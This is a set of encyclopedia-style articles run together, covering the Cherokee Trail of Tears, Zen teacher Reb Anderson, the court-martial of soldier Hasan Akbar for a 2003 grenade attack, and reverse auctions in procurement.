which greatly frustrated General Wool, who reported that the Indians were \\"almost universally opposed to the treaty.\\" During this time, efforts were also being made by pro-removal advocates within the Cherokee to persuade the rest of the people to accept government subsistence and therefore give in to the inevitable. The treaty party called a meeting of the Cherokee on September 12, 1836 to do just that, but the meeting was canceled due to John Ross's subsequent call for another meeting that opposed the goals of the first in every way. Ross urged the people to continue to reject any government handout, stressing that the acceptance of any such gift also meant the acceptance of the treaty terms. Seeing that all efforts to sway their brethren were fruitless, a number of Cherokee (mostly members of the Ridge faction) ceased their delay and accepted government funds for subsistence and transportation. An approximate total of 10,000 Cherokee voluntarily removed themselves to the west, leaving around 1,000 of their brethren behind, who continued their opposition. Many travelled as individuals or families, but there were several organized groups: # John S. Young, Conductor; via river boats; 466 Cherokee and 6 Creek, left March 1, 1837; arrived March 28, 1837; included Major Ridge and Stand Watie. # B.B. Cannon, Conductor; overland; 355 persons (15 deaths); left Oct.15, 1837; arrived Dec.29, 1837; included James Starr. # Rev.

Edward Deas and John Adair Bell, Co-Conductors, overland, 660 persons left Oct. 11, 1838; 650 arrived Jan. 7, 1839. There are muster rolls for groups # 1, 3 ‚Äì 6 and daily journals of conductors for groups # 2 and 5 among records of the Bureau of Indian Affairs in the National Archives. Despite the government blandishments, only a few hundred volunteered to accept the Treaty terms for Removal. =Forced removal= Many Americans were outraged by the dubious legality of the treaty and called on the government not to force the Cherokee to move. For example, on April 23, 1838, Ralph Waldo Emerson wrote a letter to Jackson's successor, President Martin Van Buren, urging him not to inflict \\"so vast an outrage upon the Cherokee Nation.\\"Letter to President Van Buren , Ralph Waldo Emerson, April 23, 1838. Nevertheless, as the May 23, 1838, deadline for voluntary removal approached, President Van Buren assigned General Winfield Scott to head the forcible removal operation. He arrived at New Echota on May 17, 1838, in command of U.S. Army and state militia totalling about 7,000 soldiers. Scott discouraged mistreatment of the Native Americans, ordering his troops to \\"show every possible kindness to the Cherokee and to arrest any soldier who inflicted a wanton injury or insult on any Cherokee man, woman, or child.\\" They began rounding up Cherokee in Georgia on May 26, 1838; ten days later, operations began in Tennessee, North Carolina, and Alabama. Men, women, and children were removed at gunpoint from their homes over three weeks and gathered together in concentration camps, often with very few of their possessions. About 1,000 Cherokee took refuge in the mountains to the east, and some who owned private property also escaped the evacuation. Private John G. Burnett later wrote \\"Future generations will read and condemn the act and I do hope posterity will remember that private soldiers like myself, and like the four Cherokee who were forced by General Scott to shoot an Indian Chief and his children, had to execute the orders of our superiors. We had no choice in the matter.\\" This story is perhaps a garbled version of the episode when a Cherokee named Tsali or Charley and three others killed two soldiers in the North Carolina mountains during the round-up. The two Indians were subsequently tracked down and executed by Chief Euchella's band of Cherokee in exchange for a deal with the Army to avoid their own removal. The Cherokee were then marched overland to departure points at Ross's Landing (Chattanooga, Tennessee) and Gunter's Landing (Guntersville, Alabama) on the Tennessee River, and forced on to flatboats and the steamers \\"Smelter\\" and \\"Little Rock\\". Unfortunately, a drought brought low water levels on the rivers, requiring frequent unloading of vessels to evade river obstacles and shoals. The Army directed Removal was characterized by many deaths and desertions, and this part of the Cherokee Removal proved to be a fiasco and Gen. Scott ordered suspension of further removal efforts. The Army- operated groups were : # Lt. Edward Deas, Conductor; 800 left June 6, 1838 by boat; 489 arrived June 19, 1838. # Lt. Monroe, Conductor, 164 persons left June 12, 1838; arrival unknown. # Lt. R.H.K. Whiteley, ca. 800 persons left June 13, 1838 by boat, arrived Aug. 5, 1838 (70 deaths). # Captain Gustavus S. Drane, Conductor, 1072 left June 17, 1838 by boat, 635 arrived Sept. 7, 1838 (146 deaths, 2 births). Muster rolls for groups # 1 and 4 are in the records of the Bureau of Indian Affairs and # 2 in records of the Army Continental Commands (Eastern Division, Gen. Winfield Scott's papers) in the National Archives. There are daily journals of conductors for groups # 1 and 3 among Special Files of the Bureau of Indian Affairs. Internment camps Fort Marr Blockhouse in Benton, Tennessee, is the last surviving remnant of the forts used to intern the Cherokee in preparation for their removal to Indian Territory. The deaths and desertions in the Army's boat detachments caused Gen Scott to suspend the Army's Removal efforts, and the remaining Cherokee were put into eleven internment camps, mostly located near Ross's Landing (in present-day Chattanooga, Tennessee)), at Red Clay, Bedwell Springs, Chatata, Mouse Creek, Rattlesnake Springs, Chestoee, and Calhoun (site of the former Cherokee Agency) located within Bradley County, Tennessee, and one camp (Fort Payne) in Alabama. Cherokee remained in the camps during the summer of 1838 and were plagued by dysentery and other illnesses, which led to 353 deaths. A group of Cherokee petitioned General Scott for a delay until cooler weather made the journey less hazardous. This was granted; meanwhile Chief Ross, finally accepting defeat, managed to have the remainder of the removal turned over to the supervision of the Cherokee Council. Although there were some objections within the U.S. government because of the additional cost, General Scott awarded a contract for removing the remaining 11,000 Cherokee under the supervision of Principal Chief Ross, with expenses to be paid by the Army, which outraged President Van Buren and surprised many. =Reluctant removal= Chief John Ross made sure to confirm and secure his position as leader of the removal process by conferring with other Cherokee leaders, who granted him full responsibility of this daunting task. He then wasted no time in forming a plan, in which he organized 12 wagon trains, each with about 1000 persons and conducted by veteran full-blood tribal leaders or educated mixed bloods. Each wagon train was assigned physicians, interpreters (to help the physicians), commissaries, managers, wagon masters, teamsters, and even grave diggers. Chief Ross also purchased the steamboat Victoria in which his own and tribal leaders' families could travel in some comfort. Lewis Ross, the Chief's brother, was the main contractor and furnished forage, rations, and clothing for the wagon trains. Although this arrangement was an improvement for all concerned, disease and exposure still took many lives. This is the part of the Removal usually identified as The \\"Trail of Tears.\\" These detachments were forced to trek through various trails, crossing through Kentucky, Illinois, Tennessee, Mississippi, Arkansas, and Missouri to the final destination of Oklahoma. One of the main routes began in Chattanooga, TN and took a northwestern route through eastern Kentucky and southern Illinois before bearing to the southwest near the center of Missouri. The entire trip was roughly 2,200 miles. The Cherokee endured freezing temperatures, snowstorms, and pneumonia. The harshness of the trail and the intense weather conditions claimed around 4,000 lives, although estimates vary. # Daniel Colston, Conductor (first choice Hair Conrad became ill); Asst. Conductor Jefferson Nevins; 710 persons left Oct.5, 1838 from Agency camp and 654 people arrived at Woodall's place in Indian Territory on Jan. 4, 1839 (57 deaths, 9 births, 24 deserters). # Elijah Hicks, Conductor; White Path (died near Hopkinsville, Kentucky) and William Arnold, Asst.

Hicks, and Hildebrand) of the 12 wagon trains and payrolls of officials for all 13 detachments among the personal papers of Principal Chief John Ross in the Gilcrease Institution in Tulsa, OK. Deaths and numbers This monument at the New Echota Historic Site honors Cherokees who died on the Trail of Tears. Blythe's Ferry, one of the trail's departure points The number of people who died as a result of the Trail of Tears has been variously estimated. American doctor and missionary Elizur Butler, who made the journey with the Daniel Colston wagon train, estimated 2,000 deaths in the Army removal and internment camps and perhaps another 2,000 on the trail; his total of 4,000 deaths remains the most cited figure, although he acknowledged these were estimates without having seen government or tribal records. A scholarly demographic study in 1973 estimated 2,000 total deaths; another, in 1984, concluded that a total of 6,000 people died.Prucha, Great Father, p. 241 note 58; Ehle, Trail of Tears, pp. 390‚Äì92; Russel Thornton, \\"Demography of the Trail of Tears\\" in Anderson, Trail of Tears, pp. 75‚Äì93. The 4000 figure or one quarter of the tribe was also used by the Smithsonian anthropologist James Mooney. Since 16,000 Cherokee were enumerated on the 1835 Census, and about 12,000 emigrated in 1838, ergo 4000 needed accounting for. Some 1500 Cherokee remained in North Carolina, many more in South Carolina, and Georgia, so the higher fatality numbers are unlikely. In addition, nearly 400 Creek or Muskogee Indians who had avoided being removed earlier fled into the Cherokee Nation and became part of the latter's Removal. An accounting of the exact number of fatalities during the Removal is also related to discrepancies in expense accounts submitted by Chief John Ross after the Removal that the Army considered inflated and possibly fraudulent. Ross claimed rations for 1600 more Cherokee than were counted by an Army officer, Captain Page, at Ross's Landing as Cherokee groups left their homeland and another Army officer, Captain Stephenson, at Fort Gibson counted them as they arrived in Indian Territory. Ross's accounts are consistently higher numbers than that of the Army disbursing agents.Cherokee Indian Removal. Encyclopedia of Alabama. (retrieved 28 Sept 2009) The Van Buren administration refused to pay Ross, but the later Tyler administration eventually approved disbursing more than $500,000 to the Principal Chief in 1842. In addition, some Cherokee traveled from east to west more than once. Many deserters from the Army's boat detachments in June 1838 later emigrated in the twelve Ross wagon trains. There were transfers between groups, and later join ups and desertions were not always recorded. Jesse Mayfield was a white man with a Cherokee family went twice (first voluntarily in B.B. Cannon's detachment in 1837 to Indian Territory; unhappy there, he returned to the Cherokee Nation; and in Oct. 1838 was Wagon Master for the Bushyhead Detachment). An Army disbursing agent discovered that a Cherokee named Justis Fields travelled with government funds three times under different aliases. A mixed-blood named James Bigby, Jr. travelled to Indian Territory five times (three as government interpreter for different detachments, as Commissary for the Colston detachment, and as an individual in 1840). In addition, a small but significant number of mixed- bloods and whites with Cherokee families petitioned to become citizens of Alabama, Georgia, North Carolina, South Carolina, or Tennessee and thus ceased to be considered Cherokee. During the journey, it is said that the people would sing \\"Amazing Grace\\", using its inspiration to improve morale. The traditional Christian hymn had previously been translated into Cherokee by the missionary Samuel Worcester with Cherokee assistance. The song has since become a sort of anthem for the Cherokee people.Steve Turner, Amazing Grace: The Story of America's Most Beloved Song (Harper Collins, 2003), p. 167; Deborah L Duvall, Tahlequah: The Cherokee Nation (Arcadia Publishing, 2000), p. 35; Richard M. Swiderski, The Metamorphosis of English (Bergin Garvey/Greenwood, 1996), p. 91. Aftermath Hwy 71, Fayetteville, Arkansas. Cherokee Heritage Centre (Tahlequah, Oklahoma) Cherokee who were removed initially settled near Tahlequah, Oklahoma. The political turmoil resulting from the Treaty of New Echota and the Trail of Tears led to the assassinations of Major Ridge, John Ridge, and Elias Boudinot; of those targeted for assassination that day, only Stand Watie escaped his assassins. The population of the Cherokee Nation eventually rebounded, and today the Cherokee are the largest American Indian group in the United States. There were some exceptions to removal. Those Cherokee who lived on private, individually owned lands (rather than communally owned tribal land) were not subject to removal. In North Carolina, about 400 Cherokee led by Yonaguska lived on land along the Oconaluftee River in the Great Smoky Mountains owned by a white man named William Holland Thomas (who had been adopted by Cherokee as a boy), and were thus not subject to removal, and these were joined by a smaller band of about 150 along the Nantahala River led by Utsala. Along with a group living in Snowbird and another along the Cheoah River in a community called Tomotley, these North Carolina Cherokee became the Eastern Band of the Cherokee Nation, numbering approximately 1000. According to a roll taken the year after the removal (1839), there were in addition some estimated about 400 of Georgia, South Carolina, Tennessee, and Alabama, and these also joined the EBCI. A local newspaper, the Highland Messenger, said July 24, 1840, ‚Äúthat between nine hundred and a thousand of these deluded beings ‚Ä¶ are still hovering about the homes of their fathers, in the counties of Macon and Cherokee\\" and \\"that they are a great annoyance to the citizens\\" who wanted to buy land there believing the Cherokee were gone; the newspaper reported that President Jackson said \\"they ‚Ä¶ are, in his opinion, free to go or stay.‚Äô The Trail of Tears is generally considered to be one of the most regrettable episodes in American history. To commemorate the event, the U.S. Congress designated the Trail of Tears National Historic Trail in 1987.Trail Of Tears National Historic Trail from the National Park Service It stretches across nine states for . In 2004, during the 108th Congress, Senator Sam Brownback (Republican of Kansas) introduced a joint resolution (Senate Joint Resolution 37) to \\"offer an apology to all Native Peoples on behalf of the United States\\" for past \\"ill-conceived policies\\" by the United States Government regarding Indian Tribes. It passed in the U.S. Senate in February 2008. As of 2014, Cherokee Nation members can request heritage seeds for a species of beans carried on the Trail of Tears from the Cherokee Seed Project.

He is a Senior Dharma teacher at the San Francisco Zen Center and at Green Gulch Farm Zen Center in Marin County, California, where he lives. According to author James Ishmael Ford, \\"Reb Anderson is one of the most prominent of contemporary Western Zen teachers.\\" Biography Reb Anderson was born as Harold Anderson in Mississippi in 1943 and grew up in Minnesota. His father left the family when Anderson was eleven. In his youth, he was a Golden Gloves boxer. Anderson developed an interest in Buddhism while still in his teens. In 1967, he abandoned his graduate studies in psychology and mathematics to study Soto Zen under Shunryu Suzuki at the San Francisco Zen Center. Anderson was then ordained as a priest in 1970 by Suzuki, who gave Anderson the Buddhist name Tenshin Zenki Â§©ÁúûÂÖ®Ê©ü (Naturally Real, The Whole Works). In 1983 Anderson received shiho from Zentatsu Richard Baker, becoming Baker's first Dharma heir. However, when Baker was forced to resign amid complaints about his affairs with female Zen Center members and his purchase of expensive luxury goods, Baker claimed Anderson never completed the entire transmission ceremony. The board of the San Francisco Zen Center disagreed, understanding Anderson to be Baker's Dharma heir (Baker has since agreed). After Baker's resignation, Anderson replaced him as abbot. Tenshin Reb Anderson In a controversial incident, while jogging in Golden Gate Park in 1983, Anderson found the corpse of a man with a bullet wound to the head and a revolver nearby. Anderson returned to the body over a period of several days to meditate over the corpse, on one visit taking the revolver. In 1987, Anderson was mugged one block away from the San Francisco Zen Center. He retrieved the unloaded revolver and chased the perpetrator to a nearby tenement, where both were quickly arrested. The Zen Center Board of Directors sent him on a leave of absence for six months. After his return, he served as co-abbot with Mel Weitsman until 1995. Regarding this ordeal, Anderson has written of his remorse and insight garnered from the experience.: \\"On both a personal and a professional level, I am still dealing with the consequences of this episode. Some people felt that I had committed an irrevocable betrayal of trust, and have discounted me and my teaching ever since. Others were more forgiving, but their trust in me and my integrity was permanently shaken. Even newer students, who come to Zen Center and find out about these incidents, are sometimes confused and question whether I can be their teacher. These events are a helpful reminder‚Äîboth to me and to others‚Äîof my vulnerability to arrogance and inflation. I see how my empowerment to protect and care for the Triple Treasure inflated my sense of personal authority, and thus detracted from and disparaged the Triple Treasure. This ancient twisted karma I now fully avow.\\" In October 1999 Anderson suffered a heart attack while conducting dokusan. He later underwent a successful emergency angioplasty. Anderson is married to Rusa Chiu, a Jungian analyst in private practice. He has two daughters, Deborah Savran and Thea Anderson, and four grandchildren. Teaching style According to James Ishmael Ford, \\"...Anderson Roshi is one of the first people to have worked hard to bring Dogen studies West. He has also stretched much of Zen's traditional approach to psychology by drawing upon other ancient Buddhist sources, including Abhidharma and Yogachara teaching, while at the same time being solidly informed regarding Western approaches to the discipline.\\" To some students, \\"...Reb's practice invites comparison to the legendary Japanese samurai, the warriors who trained in medieval Zen monasteries.\\" Dharma heirs Sobun Katherine Thanas received shiho from Tenshin Roshi in 1988 and later was installed as abbess of the Santa Cruz Zen Center. Zengyu Paul Discoe, Chikudo Jerome Peterson and Ananda Claude Dalenburg also received shiho in 1988 (Ananda was the inspiration for the character Bud Diefendorf in Jack Kerouac's novel The Dharma Bums). Anderson gave shiho to his student Jiko Linda Cutts in 1996, who went on to serve as co-abbess of the San Francisco Zen Center from 2000 until 2007. She has served as Central Abbess of San Francisco Center from 2014 to 2019. Jakujo Gary McNabb received shiho in 1998. Furyu Nancy Schroeder received shiho 1999. She was installed as the abiding abbess of Green Gulch Farm Zen Center and has served from 2014 to the present. Myo Denis Lahey received shiho in 1999 and became head teacher of the Hartford Street Zen Center, Issan-ji, in San Francisco. In 2000 Taigen Dan Leighton received shiho. Leighton has since gone on to establish the Mountain Source Sangha and after moving to Chicago, Ancient Dragon Zen Gate. In 2002 Meiya Wender received shiho. She now conducts japanese tea ceremony classes at Green Gulch. Also in 2002, Anderson gave shiho to Leslie James, his first dharma entrustment to a lay teacher. She is a long-time resident of Tassajara Zen Mountain Center, the monastic center of San Francisco Zen Center.

Hasan K. Akbar was the court-martial of a United States Army soldier for a premeditated attack in the early morning hours of March 23, 2003, at Camp Pennsylvania, Kuwait, during the start of the United States invasion of Iraq. Former Sergeant Hasan Karim Akbar (born Mark Fidel Kools on April 21, 1971) threw four hand grenades into three tents in which other members of the 101st Airborne Division were sleeping, and fired his rifle at fellow soldiers in the ensuing chaos. Army Captain Christopher S. Seifert was fatally shot in the back, and Air Force Major Gregory L. Stone was killed by a grenade. Fourteen other soldiers were wounded by Akbar, mostly from grenade shrapnel. At trial, Akbar's military defense attorneys contended that Akbar had psychiatric problems, including paranoia, irrational behavior, insomnia, and other sleep disorders. In April 2005, he was convicted and sentenced to death for the murders of Seifert and Stone.\\"Honor the Fallen\\", Military Times, 2003, Retrieved 02-22-2010 The Army Court of Criminal Appeals affirmed the sentence on July 13, 2012, and the United States Court of Appeals for the Armed Forces affirmed the decision on August 19, 2015. Akbar was the first soldier since the Vietnam War to be convicted for \\"fragging\\" fellow soldiers overseas during wartime. He continues to be confined at the United States Disciplinary Barracks awaiting disposition of his sentence. Background Akbar was born Mark Fidel Kools on April 21, 1971, and grew up in Watts, Los Angeles, California.Roig-Franzia, M. (22 April 2005). \\"Army Soldier Is Convicted In Attack on Fellow Troops\\", The Washington Post, Retrieved 28 July 2008 His father, John Kools, converted to Islam while in prison on a gang- related charge, and changed his surname to Akbar before his release in 1974. Akbar's mother later converted to Islam before marrying William M. Bilal, also a Muslim convert.National Briefing: \\"South Louisiana ‚Äì A Weapons Charge\\", The New York Times, 12 September 2003, accessed 15 March 2013 She took the name Quran Bilal. She changed her son's name to Hasan Karim Akbar, to reflect his father's surname and their religion. He was raised from a young age as a Muslim. In 1988, Akbar was admitted to the University of California, Davis. He graduated nine years later in 1997 with Bachelor's degrees in both Aeronautical and Mechanical Engineering.\\"Iraq war hits closer to home with arrest of UC Davis alum\\", UC Davis News & Information The university said that Kools had stopped and restarted his studies during those years, lengthening the time it took him to complete his degrees. He participated in the Reserve Officers' Training Corps during college, but did not receive a commission. Deeply in debt, he joined the Army as an enlisted member.Madeleine Gruen, \\"Backgrounder: Sgt. Hasan Akbar\\", The NEFA Foundation, January 2010 A few years later, Akbar was a sergeant (E-5) and a combat engineer assigned to Company A, 326th Engineer Battalion, 101st Airborne Division. By March 2003, elements of the division were staging at Camp Pennsylvania, a U.S. military encampment in the Northern desert of Kuwait, in connection with the upcoming invasion of Iraq. In the early morning hours of March 23, 2003, Akbar turned off a power generator which was operating lights in the area where the attack occurred. Next, Akbar threw four M67 fragmentation hand grenades into three tents in which other members of the division were sleeping, causing numerous injuries. In the resulting chaos, Akbar also fired his M4 rifle at fellow soldiers. Killed were Army Captain Christopher S. Seifert, assistant S-2 (intelligence and security officer) of the 1st Brigade, 101st Airborne Division and Air Force Major Gregory L. Stone, a member of the 124th Air Support Operations Squadron, Idaho Air National Guard. Seifert, age 27, was fatally shot in the back, while Stone, age 40, suffered 83 shrapnel wounds. Fourteen other soldiers were injured. Court-martial Williams Township, Northampton County, Pennsylvania. Funeral of Gregory L. Stone at Arlington National Cemetery (April 17, 2003) In 2005, Akbar, the sole suspect, was tried by court martial at Fort Bragg, North Carolina, before a military jury of nine officers, ranking from Major to Colonel, and six senior non-commissioned officers. The jury was composed of thirteen men and two women. Although Akbar confessed to the crimes, his lawyers claimed during the 2005 trial that he had a history of mental illness which was known to the military. Background accounts of Akbar's life suggested previous difficulties in adjusting to university and to the military. His father John Akbar was reported by the Associated Press as saying that his son had told him of complaining to superiors about \\"religious and racial harassment.\\" The defense did not produce any witnesses at his court martial related to this assertion. Akbar's superiors considered his performance in the Army substandard. While assigned to the 326th Engineer Battalion, he was demoted from a squad leader position and given lower-level tasks. Fellow soldiers said that Akbar was isolated, \\"rarely in the company of others and was seen talking to himself.\\" In Akbar's early years with the unit, superiors had noted the sergeant had \\"an attitude problem\\". Military officials attributed Akbar's motive in the immediate case to resentment.\\"Army: U.S. Soldier Acted Out of Resentment in Grenade Attack\\", FOX News Akbar was reported as having been recently reprimanded for insubordination, and was told he would not join his unit's push into Iraq. Excerpts from his diary have been released. In an entry dated February 4, 2003, Akbar referred to mistreatment by his fellow soldiers: :\\"I suppose they want to punk me or just humiliate me. Perhaps they feel that I will not do anything about that. They are right about that. I am not going to do anything about it as long as I stay here. But as soon as I am in Iraq, I am going to try and kill as many of them as possible.\\" In another entry written before the attack, Akbar wrote, \\"I may not have killed any Muslims, but being in the army is the same thing. I may have to make a choice very soon on who to kill.\\"\\"Hasan Akbar's Chilling Diary Entries\\", [Weblog] ‚Äì Daniel Pipes, Mid- East Forum Prosecutors alleged in the court martial that his diary entries, together with his actions of stealing hand grenades and turning off the generator that lit the camp, showed that the attack was premeditated. His conviction on these charges led to the death sentence. His military defense attorneys said that Akbar was diagnosed with psychiatric problems at the age of 14. He had suffered worsening symptoms in the military, which included \\"paranoia, irrational behavior, insomnia and other sleep disorders,\\" making it impossible for him to do his job.Shaila Dewan, \\"Trial Opens for Sergeant Accused of Killing 2 Officers\\", The New York Times, 12 April 2005, accessed 15 March 2013 During his court martial, Akbar tried to explain his actions: he said he felt his life was \\"in jeopardy\\" and he had \\"other problems\\". At one point during his trial, Akbar smuggled a sharp object out of a conference room. He asked the military policeman guarding him to remove his hand cuffs so he might use the restroom. When the MP removed the restraints, Akbar stabbed the MP in the shoulder and neck before being wrestled to the ground by another MP.

In an ordinary auction (also known as a 'forward auction'), buyers compete to obtain goods or services by offering increasingly higher prices. In contrast, in a reverse auction, the sellers compete to obtain business from the buyer and prices will typically decrease as the sellers underbid each other. A reverse auction is similar to a unique bid auction because the basic principle remains the same; however, a unique bid auction follows the traditional auction format more closely as each bid is kept confidential and one clear winner is defined after the auction finishes. For business auctions, the term refers to a specific type of auction process (also called procurement auction, e-auction, sourcing event, e-sourcing or eRA, eRFP, e-RFO, e-procurement, B2B Auction). Open procurement processes, which are a form of reverse auction, have been commonly used in government procurement and in the private sector in many countries for many decades. For consumer auctions, the term is often used to refer to a sales processes that share some characteristics with auctions, but are not necessarily auctions in the traditional sense. Context One common example of reverse auctions is, in many countries, the procurement process in the public sector. Governments often purchase goods or services through an open procurement process by issuing a public tender. Public procurement arrangements for large projects or service programs are often quite complex, frequently involving dozens of individual procurement activities. Another common application of reverse auctions is for e-procurement, a purchasing strategy used for strategic sourcing and other supply management activities. E-procurement arrangements enable suppliers to compete online in real time and is changing the way firms and their consortia select and behave with their suppliers worldwide. It can help improve the effectiveness of the sourcing process and facilitate access to new suppliers. This may in the future lead to a standardization of sourcing procedures, reduced order cycle, which can enable businesses to reduce prices and generally provide a higher level of service.Srivastava, Samir K, \\"Managerial Implications from Indian Case Studies on e-Reverse Auctions\\", Business Process Management Journal, 18(3), 2012, pp. 513-531. * In a traditional auction, the seller offers an item for sale. Potential buyers are then free to bid on the item until the time period expires. The buyer with the highest offer wins the right to purchase the item for the price determined at the end of the auction. * A reverse auction is different in that a single buyer offers a contract out for bidding. (In an e-procurement arrangement this is done either by using specialized software or through an on-line marketplace.) Multiple sellers are invited to offer bids on the contract. E-procurement In the case of e-procurement, When real-time e-bidding is permitted, the price decreases as sellers compete to offer lower bids than their competitors whilst still meeting all of the specifications of the original contract. Bidding performed in real-time via the Internet results in a dynamic, competitive process. This helps achieve rapid downward price pressure that is not normally attainable using traditional static paper-based bidding processes. Many reverse auction software companies or service providers report an average price reduction of 18-20 percent following the initial auction's completion. The buyer may award the contract to the seller who bid the lowest price. Or, a buyer may award contracts to suppliers who bid higher prices depending on the buyer's specific needs with regard to quality, lead-time, capacity, or other value-adding capabilities. The use of optimization software has become popular since 2002 to help buyers determine which supplier is likely to provide the best value in providing goods or services. The software includes relevant buyer and seller business data, including constraints. Reverse auctions are used to fill both large and small value contracts for both public sector and private commercial organizations. In addition to items traditionally thought of as commodities, reverse auctions are also used to source buyer-designed goods and services; and they have even been used to source reverse auction providers. The first time this occurred was in August 2001, when America West Airlines (now US Airways) used FreeMarkets software and awarded the contract to MaterialNet. One form of reverse auction is static auction (RFQ or tender). Static auction is alternative to dynamic auction and regular negotiation process in commerce especially on B2B electronic marketplace. In 2003, researchers claimed an average of five percent of total corporate spending was sourced using reverse auctions.Beall, S., Carter, C., Carter, P., Germer, T., Hendrick, T., Jap, S., Kaufmann, L., Maciejewski, D., Monczka, R., and Peterson, K., (2003), \\"The Role of Reverse Auctions in Strategic Sourcing\\", CAPS Research Report, CAPS Research, Tempe, AZ They have been found to be more appropriate and suitable in industries and sectors like advertising, auto components, bulk chemicals, consumer durables, computers and peripherals, contract manufacturing, courier services, FMCG, healthcare, hospitality, insurance, leasing, logistics, maritime shipping, MRO, retail, software licensing, textiles, tourism, transport and warehousing. History of internet-based reverse auctions The pioneer of online e-procurement reverse auctions in the United States, FreeMarkets, was founded in 1995 by former McKinsey consultant and General Electric executive Glen Meakem after he failed to find internal backing for the idea of a reverse auction division at General Electric. Meakem hired McKinsey colleague Sam Kinney, who developed much of the intellectual property behind FreeMarkets. Headquartered in Pittsburgh, PA, FreeMarkets built teams of \\"market makers\\" and \\"commodity managers\\" to manage the process of running the online tender process and set up market operations to manage auctions on a global basis. The company's growth was aided greatly by the hype of the dot- com boom era. FreeMarkets customers included BP plc, United Technologies, Visteon, H.J. Heinz, Phelps Dodge, Exxon Mobil, and Royal Dutch Shell, to name a few. Dozens of competing start-up reverse auction service providers and established companies such as General Motors (an early FreeMarkets customer) and SAP, rushed to join the reverse auction marketspace. Although FreeMarkets survived the winding down of the dot-com boom, by the early-2000s, it was apparent that its business model was really like an old-economy consulting firm with some sophisticated proprietary software. Online reverse auctions started to become mainstream and the prices that FreeMarkets had commanded for its services dropped significantly. This led to a consolidation of the reverse auction service marketplace. In January 2004, Ariba announced its purchase of FreeMarkets for US$493 million. Fortune published an article in March 2000, describing the early days of internet-based reverse auctions. In the past few years mobile reverse auction have evolved. Unlike business-to-business (B2B) reverse auctions, mobile reverse auctions are business-to-consumer (B2C) and allow consumers to bid on products for pennies. The lowest unique bid wins. Very recently business-to-consumer auctions with a twist have started to evolve; they are more similar to the original business-to-business auctions than mobile reverse auctions in that they offer consumers the option of placing a specification before retailers or resellers and allowing them to publicly bid for their business. In congressional testimony on the 2008 proposed legislative package to use federal funds to buy toxic assets from troubled financial firms, Federal Reserve Chairman Ben Bernanke proposed that a reverse auction could be used to price the assets. In 2004, the White House Office of Federal Procurement Policy (OFPP) issued a memorandum encouraging increased use of commercially available online procurement tools, including reverse auctions.Memorandum for Federal Acquisition Council Agency Senior Procurement Executives, White House Office of Federal Procurement Policy, May 12, 2004 In 2005, both the Government Accountability Office and Court of Federal Claims upheld the legality of federal agency use of online reverse auctions.MTB Group, Inc. v. United States, 65 Fed. Cl. 516, 523-24, February 23, 2005 In 2008, OFPP issued a government-wide memorandum encouraging agencies to improve and increase competitive procurement and included specific examples of competition best practices, including reverse auctions.Memorandum for Chief Acquisition Officers, White House Office of Federal Procurement Policy, July 18, 2008 In 2010, The White House Office of Management and Budget cited \\"continued implementation of innovative procurement methods, such as the use of web-based electronic reverse auctions\\" as one of the contracting reforms helping agencies meet acquisition savings goals.Memorandum for Senior Executive Service from Jeffrey Zients, Federal Chief Performance Officer, September 14, 2010 Buyer-determined auction A buyer-determined auction is a type of reverse auctions in a procurement setting, also known simply as procurement auctions. These are auctions where bidders are the sellers, and they bid on a contract to provide supplies to the buyer. A common form of procurement auction is known as a scoring auction. In that auction form, the score that the buyer gives each bidder depends on well-defined attributes of the offer and the bidder. This scoring function is formulated and announced prior to the start of the auction. More commonly, many procurement auctions are ‚Äúbuyer determined‚Äù in that the buyer reserves the right to select the winner on any basis following the conclusion of the auction. The literature on buyer-determined auctions is often empirical in nature and is concerned with identifying the unannounced implicit scoring function the buyer uses. This is typically done through a discrete choice model, wherein the econometrician uses the observed attributes, including price, and maps them to the probability of being chosen as the winner. This allows the econometrician to identify the weight on each attribute. Jap, S. D., & Haruvy, E. (2008). Interorganizational relationships and bidding behavior in industrial online reverse auctions. Journal of Marketing Research, 45(5), 550-561. Conceptually and theoretically, the effect of this format on buyer-supplier relationships is of paramount importance.Jap, S. D. (2007). The impact of online reverse auction design on buyer‚Äìsupplier relationships. Journal of Marketing, 71(1), 146-159. Theoretically, the factors that determine under what circumstances a buyer would prefer this format have been explored. Engelbrecht-Wiggans, R., Haruvy, E., & Katok, E. (2007).

Spectrum auction In the United States, the Federal Communications Commission created FCC auction 1001 as a reverse auction in order to get back much of the 600MHz band from television broadcasting. The remaining TV stations would then be repacked onto the lower UHF and even VHF TV channels. After the reverse auction in June 2016, a forward spectrum auction (FCC auction 1002) will then be held, with mostly mobile phone carriers as the buyers.  Dutch reverse auctions  While a traditional Dutch Auction starts at a high bid which will then decrease, a Reverse Dutch Auction works the opposite way as it starts at a low price and then gradually increases over time. It contains a list of items that buyers want to procure and the price rises after fixed intervals until a reserved price is reached. Before the reserved price is reached, if a supplier places a bid for the item, it is allocated to the supplier and the item closes for bidding. In this auction, the buyer specifies a starting price, price change value, time interval between price changes, and the reserved price. The auction opens with the first item with a specified start price and increases by the price change value (amount or percentage) after a fixed interval. The start price keeps on increasing until any supplier places a bid or the start price reaches the reserved price. After the bidding is closed for the item it moves to another item sequentially. Auction is closed when the bidding for all items is completed.  Japanese reverse auctions  Although the history of the Japanese reverse auction is unknown, they are widely used in the world of business-to-business procurement as a form of cost negotiation. A Japanese auction is where the host of the auction states an opening price and participants have to accept that price level or withdraw from the auction. Acceptance indicates that the participant is prepared to supply at the stated price. When all participants reply to a certain price, the software lowers the price level by a predetermined amount and again asks participants to accept or decline at the new price level. This kind of auction continues until there are no more participants bidding.  Comparison of Japanese and Dutch reverse auctions  The major difference between Japanese and Dutch reverse auctions is in putting suppliers in two different position. While in Dutch reverse auctions suppliers opt-in at intended price point and thus end the auction immediately, in reverse Japanese auctions suppliers explicitly opt-out of a given market at their intended price point. The benefits of the Japanese reverse auction are based on the fact that the buying organization has greater transparency to the actual market itself. In this regard, the format more closely mirrors that of a traditional reverse auction by providing greater visibility to each participant's lowest offer. But in contrast to a Dutch auction format, Japanese auctions do not put what one Dutch auction users describes as \\"maximum psychological pressure\\" on the supply base and especially on the incumbent suppliers. This can put the buyer in a better position regarding with potentially earning more than he should based on the market.  Strategy in Reverse auctions  The suppliers should firstly determine the lowest price for which they are willing to sell their products. To do this effectively they must be able to compute their true marginal cost and identify extra-auctions costs and benefits. However, that does not mean that the best strategy is to bid the lowest price. In the analysis of extra- auction costs and benefits, they should examine areas where winning or losing can generate unexpected benefits or avoided costs. Some examples include: * Winning or losing changes their volume discount, rebates and incentives with key suppliers, * Losing requires laying off personnel with its associated termination costs, * Winning opens a new account more inexpensively than hiring a sales representative. Based on this analysis, the supplier should choose his goals for the auction. The obvious goal is to win the auction 